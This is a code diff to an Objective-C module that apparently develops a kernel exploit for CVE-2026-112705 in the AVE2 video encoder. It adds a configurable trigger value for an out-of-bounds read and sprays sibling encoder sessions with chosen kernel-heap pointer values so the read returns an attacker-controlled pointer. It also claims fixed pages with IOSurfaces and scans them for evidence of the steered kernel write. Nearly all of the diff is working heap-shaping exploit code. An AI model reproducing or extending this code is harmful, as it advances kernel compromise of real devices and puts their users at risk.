@@ -4,10 +4,12 @@
 #import <VideoToolbox/VideoToolbox.h>
 #import <CoreVideo/CoreVideo.h>
 #import <mach/mach.h>
+#import <dlfcn.h>
 
 @interface KPAuditAVESpriteModule ()
 @property (nonatomic, assign) int sprayCount;
 @property (nonatomic, assign) uint32_t marker;
+@property (nonatomic, assign) int ntl;
 @property (nonatomic, copy) NSString *identifier;
 @property (nonatomic, copy) NSString *title;
 @property (nonatomic, copy) NSString *subtitle;
@@ -18,13 +20,19 @@
 @implementation KPAuditAVESpriteModule
 
 - (instancetype)initWithSprayCount:(int)count marker:(uint32_t)marker {
+    return [self initWithSprayCount:count marker:marker ntl:16463];
+}
+
+- (instancetype)initWithSprayCount:(int)count marker:(uint32_t)marker ntl:(int)ntl {
     self = [super init];
     if (self) {
         _sprayCount = count;
         _marker = marker;
+        _ntl = ntl;
         _identifier = [NSString stringWithFormat:@"ave112705.sprite%d.armed", count];
         _title = [NSString stringWithFormat:@"AVE2 sprite x%d", count];
-        _subtitle = @"CVE-2026-112705: spray sessions, then victim NTL=16463 — far register is the oracle";
+        _subtitle = [NSString stringWithFormat:
+                     @"CVE-2026-112705: shape OOB read with pointer candidates (NTL=%d)", ntl];
         _icon = @"square.grid.3x3.middle.filled";
         _section = KPTestSectionKernelProbes;
     }
@@ -88,6 +96,20 @@
     const int32_t W = 1280, H = 720;
     const int32_t sw = 64, sh = 64;
 
+    // x0 candidates — exactly the addresses the steered NTL band (15967..16014)
+    // computes: ((NTL-16463) << 32) | 0x59 with the high dword in kheap
+    // 0xfffffe10..0xfffffe3f. Storing these in siblings lets a shaped OOB read
+    // return a value WE chose — a controlled pointer into stp x0, x0, [x0].
+    uint64_t x0cands[8];
+    int ncand = 0;
+    for (uint32_t hi = 0x10; hi <= 0x38; hi += 0x08) {
+        x0cands[ncand++] = ((uint64_t)(uint32_t)(0xFFFFFE00u + hi) << 32) | 0x59ULL;
+    }
+    [report appendString:@"x0 candidates in spray:\n"];
+    for (int c = 0; c < ncand; c++) {
+        [report appendFormat:@"  cand[%d] = 0x%016llx\n", c, x0cands[c]];
+    }
+
     // 1) VICTIM session first — its pInfo is allocated BEFORE the spray,
     //    so spray siblings land after it in the zone (forward OOB reads them).
     VTCompressionSessionRef victim = [self makeSessionWidth:W height:H];
@@ -95,7 +117,7 @@
         [report appendString:@"\nVERDICT: VICTIM_SESSION_FAILED\n"];
         return report;
     }
-    int ntl = 16463;
+    int ntl = self.ntl;
     VTSessionSetProperty(victim, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(ntl));
     int usage = 1;
     VTSessionSetProperty(victim, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@(usage));
@@ -116,9 +138,45 @@
         VTSessionSetProperty(s, CFSTR("ExpectedFrameRate"), (__bridge CFNumberRef)@(marker));
         VTSessionSetProperty(s, CFSTR("MaxKeyFrameIntervalDuration"), (__bridge CFNumberRef)@(marker));
         VTSessionSetProperty(s, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@(marker));
+        // every second sibling carries a full-width pointer candidate in the
+        // 64-bit-capable int fields — the shaped read then returns OUR x0
+        if ((i & 1) == 0) {
+            int64_t pv = (int64_t)x0cands[i % ncand];
+            VTSessionSetProperty(s, CFSTR("AverageBitRate"), (__bridge CFNumberRef)@(pv));
+            VTSessionSetProperty(s, CFSTR("MaxKeyFrameInterval"), (__bridge CFNumberRef)@(pv));
+        }
         [siblings addObject:[NSValue valueWithPointer:s]];
     }
-    [self journal:[NSString stringWithFormat:@"SPRAY_DONE n=%d marker=0x%08x", (int)siblings.count, self.marker]];
+    [self journal:[NSString stringWithFormat:@"SPRAY_DONE n=%d marker=0x%08x ntl=%d",
+                   (int)siblings.count, self.marker, ntl]];
+
+    // Dense fixed-page spray (strategy doc): own the pages at 0xfffffeXX00000059
+    // so a steered write lands in OUR buffers and can be scanned afterwards.
+    typedef void *(*SpriteISCreateFn)(CFDictionaryRef);
+    typedef int (*SpriteISLockFn)(void *, uint32_t, uint32_t *);
+    typedef int (*SpriteISUnlockFn)(void *, uint32_t, uint32_t *);
+    typedef void *(*SpriteISGetBaseFn)(void *);
+    typedef size_t (*SpriteISGetSizeFn)(void *);
+    void *isLib = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
+    SpriteISCreateFn sIsCreate = isLib ? (SpriteISCreateFn)dlsym(isLib, "IOSurfaceCreate") : NULL;
+    SpriteISLockFn sIsLock = isLib ? (SpriteISLockFn)dlsym(isLib, "IOSurfaceLock") : NULL;
+    SpriteISUnlockFn sIsUnlock = isLib ? (SpriteISUnlockFn)dlsym(isLib, "IOSurfaceUnlock") : NULL;
+    SpriteISGetBaseFn sIsGetBase = isLib ? (SpriteISGetBaseFn)dlsym(isLib, "IOSurfaceGetBaseAddress") : NULL;
+    SpriteISGetSizeFn sIsGetSize = isLib ? (SpriteISGetSizeFn)dlsym(isLib, "IOSurfaceGetAllocSize") : NULL;
+    CFMutableArrayRef surfArray = NULL;
+    if (sIsCreate && sIsLock && sIsUnlock && sIsGetBase && sIsGetSize) {
+        surfArray = CFArrayCreateMutable(kCFAllocatorDefault, 0, &kCFTypeArrayCallBacks);
+        for (int s = 0; s < 32; s++) {
+            NSDictionary *props = @{
+                @"IOSurfaceWidth": @1024, @"IOSurfaceHeight": @2048,
+                @"IOSurfaceBytesPerElement": @4, @"IOSurfacePixelFormat": @0x42475241,
+            };
+            void *surf = sIsCreate((__bridge CFDictionaryRef)props);
+            if (surf) { CFArrayAppendValue(surfArray, surf); CFRelease(surf); }
+        }
+    }
+    [report appendFormat:@"fixed-page spray: %ld surfaces\n",
+     surfArray ? (long)CFArrayGetCount(surfArray) : 0L];
 
     // 3) VICTIM encode — the OOB read fires here. May panic the kernel.
     CVPixelBufferRef pb = [self makeBufferWidth:W height:H];
@@ -128,6 +186,45 @@
         VTCompressionSessionCompleteFrames(victim, kCMTimeInvalid);
     }
     [self journal:@"AFTER_VICTIM_ENCODE survived — no panic this time"];
+
+    // Scan the fixed-page spray for the stp x0,x0,[x0] signature: the written
+    // qwords equal x0 (a candidate) or the marker pair.
+    if (surfArray) {
+        long hits = 0;
+        CFIndex scount = CFArrayGetCount(surfArray);
+        for (CFIndex si = 0; si < scount; si++) {
+            void *surf = (void *)CFArrayGetValueAtIndex(surfArray, si);
+            uint32_t seed = 0;
+            if (sIsLock(surf, 0, &seed) != 0) continue;
+            uint8_t *base = (uint8_t *)sIsGetBase(surf);
+            size_t sz = sIsGetSize(surf);
+            if (base && sz >= 32) {
+                for (size_t off = 0; off + 32 <= sz; off += 8) {
+                    uint64_t q = *(uint64_t *)(base + off);
+                    int match = -1;
+                    for (int c = 0; c < ncand; c++) {
+                        if (q == x0cands[c]) { match = c; break; }
+                    }
+                    uint64_t markerPair = ((uint64_t)(uint32_t)marker << 32) | (uint32_t)marker;
+                    if (match < 0 && q == markerPair) match = 100 + (int)(q & 0xff);
+                    if (match >= 0) {
+                        uint64_t q2 = *(uint64_t *)(base + off + 8);
+                        uint32_t z = *(uint32_t *)(base + off + 0x18);
+                        [report appendFormat:@"    SURFACE HIT surf=%ld off=0x%zx q=0x%llx q2=0x%llx z=0x%x match=%d\n",
+                         (long)si, off, q, q2, z, match];
+                        hits++;
+                        if (hits >= 8) break;
+                    }
+                }
+            }
+            sIsUnlock(surf, 0, &seed);
+            if (hits >= 8) break;
+        }
+        [report appendFormat:@"fixed-page scan: %ld hit(s) in %ld surfaces\n", hits, (long)scount];
+        CFRelease(surfArray);
+    } else {
+        [report appendString:@"fixed-page scan: skipped (IOSurface dlsym unavailable)\n"];
+    }
 
     for (NSValue *v in siblings) {
         VTCompressionSessionInvalidate((VTCompressionSessionRef)v.pointerValue);
